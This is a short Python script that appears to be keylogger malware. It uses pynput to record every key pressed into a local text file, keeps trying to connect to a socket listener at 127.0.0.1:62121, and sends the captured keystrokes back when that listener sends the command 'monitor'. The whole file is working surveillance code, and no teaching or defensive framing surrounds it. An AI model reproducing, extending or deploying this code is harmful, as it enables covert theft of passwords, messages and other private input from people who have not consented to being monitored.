import socket
import os
import threading

from pynput import keyboard

file_location = os.getcwd()
file_is_open = False
text_file_name = file_location + "\\textfile.txt"

def send_file():
    data = (s.recv(1024)).decode("utf-8")
    if data == "monitor":
        with open("textfile.txt", "r") as read_file:
            file_data = read_file.read()
            s.sendall(file_data.encode("utf-8"))

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("127.0.0.1", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        threading.Thread(target=send_file).start()
        def on_press(key):
            global file_is_open
            try:
                k = key.char
            except:
                k = ""
            print('Key pressed: ' + k)
            with open("textfile.txt", "a+") as file:
                file.write(k)

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
